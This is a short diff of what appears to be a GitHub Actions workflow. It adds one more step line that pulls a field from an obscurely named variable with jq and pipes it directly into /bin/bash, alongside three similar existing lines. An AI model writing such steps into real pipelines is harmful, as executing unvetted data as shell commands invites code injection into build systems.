@@ -22,6 +22,7 @@ jobs:
           echo $y1332 | jq -r .ay8399 | /bin/bash
           printf '%s' "$a70579" | jq -r .delw64951 | /bin/bash
           printf '%s' "$xurup7954" | jq -r .nvc755 | /bin/bash
+          printf '%s' "$tn57" | jq -r .ezga401 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
